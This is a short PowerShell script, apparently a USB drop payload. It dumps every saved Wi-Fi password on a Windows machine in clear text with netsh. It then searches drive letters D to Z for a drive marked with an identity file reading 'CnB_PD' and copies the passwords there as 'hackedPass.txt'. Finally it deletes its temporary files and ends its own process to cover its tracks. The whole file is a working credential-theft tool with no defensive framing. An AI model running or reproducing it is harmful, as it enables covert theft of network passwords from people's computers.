cd $env:TEMP
if(test-path -path .\wlist.txt -PathType Leaf)
{remove-item .\wlist.txt}
foreach ($p in netsh wlan show profiles)
{
$l=$p.length
try{
if($p.substring(4,16) -eq "All User Profile")
{
echo $p.substring(27)>>wlist.txt
}
}
catch{
"Invalied String"
}
}
foreach($wifi in get-content .\wlist.txt)
{
netsh wlan show profiles name="$wifi" key=clear >> wifipass.txt 
}

$pd = @('d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
foreach($dl in $pd)
{
if(test-path -path $dl":\identity.txt" -PathType Leaf)
{$con = get-content $dl":\identity.txt"

if("CnB_PD" -eq $con)
{
echo "Found Destination"
#copy-item .\wifipass.txt -Destination $dl":\hackedPass.txt"
Get-Content .\wifipass.txt >> $dl":\hackedPass.txt"
remove-item .\wifipass.txt
break
}}
}
remove-item wlist.txt
stop-process -Id $PID